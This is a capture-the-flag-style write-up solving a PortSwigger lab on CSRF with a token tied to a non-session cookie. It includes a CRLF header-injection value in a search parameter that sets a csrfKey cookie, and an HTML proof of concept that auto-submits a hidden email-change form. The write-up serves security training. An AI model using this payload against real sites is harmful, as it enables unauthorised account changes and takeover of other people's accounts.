# CSRF where token is tied to non-session cookie

Lab URL :- `https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie`

![image](https://user-images.githubusercontent.com/60841283/182528291-b148eb8f-5a12-41d8-9cac-ae7e61c562a0.png)

Logging as wiener user and updating email :- 

![image](https://user-images.githubusercontent.com/60841283/182528377-15c05e6c-5043-41e3-b380-2ace81d063b7.png)

Enumeration
- Chainging csrf token leads to "Invalid token"
- Interchanging csrf token from user carlos leads to "Invalid token"
- Interchanging both the csrfKey and csrf token is valid - 200 OK

Logging as carlos user and using wiener user csrfkey and csrf token (open new logging in private window):-

![image](https://user-images.githubusercontent.com/60841283/182528569-2ec43d5f-704a-4841-bcb6-a21ca8712437.png)

![image](https://user-images.githubusercontent.com/60841283/182528705-bf1a68cc-6e78-44b0-9e5f-cfab72ba6661.png)

Update is succes 

![image](https://user-images.githubusercontent.com/60841283/182528764-c30a4478-157a-47e6-97a7-56529f8d09c9.png)

That means the csrf token and csrfKey are used in combination and not tied session cookies so a valid pair will work on any POST request.

We need two things in order to launch CSRF attack 
1) Somehow change the csrfKey value (controllable via Header Injection) as it is tied to csrf token 
2) Second is payload to send the CSRF token. (controllable)

Changing the csrfKey value :- 

![image](https://user-images.githubusercontent.com/60841283/182534422-32e85b0a-cac9-4625-874f-caed2f7d34f5.png)

Using search bar 

![image](https://user-images.githubusercontent.com/60841283/182534531-1f8ac1bd-20be-4312-ad4d-de4aab5fcb00.png)

New cookie, looking into burp :- 

![image](https://user-images.githubusercontent.com/60841283/182534979-7f81df3a-6514-42e5-bb1c-cd7a22616cef.png)

![image](https://user-images.githubusercontent.com/60841283/182535081-daba8995-3717-4d30-aa6b-8bfbf534f230.png)

Now we can control both the csrfKey and csrf token 

Updating Carlos and using his key and token 

![image](https://user-images.githubusercontent.com/60841283/182535577-d4692371-cf80-4354-9f7b-ed94cdc83bb8.png)

Crafting CSRF POC

```html
<html>
<body>
	<h1>CSRF POC</h1>
	<iframe style="display:none" name="iframe_csrf"></iframe>
	<form action="https://0a360054036f6819c06a48a800a100d2.web-security-academy.net/my-account/change-email" method="POST" id="csrf-id" target="iframe_csrf">
		<input type="hidden" name="email" value="changed@normal-user.net">
		<input type="hidden" name="csrf" value="RQyvAHMK2VSz9ADNms4iqegt227wGiG8">
	</form>
	<img style="display: none" src="https://0a360054036f6819c06a48a800a100d2.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=Ljnr90mRjsAQDQfhordCKwRr1dai0hew" onerror="document.forms[0].submit()">
</body>
</html>
```

Store and deliver to victim :- 

![image](https://user-images.githubusercontent.com/60841283/182538236-6fe0a1c5-b31b-470f-833c-97a114c7a348.png)

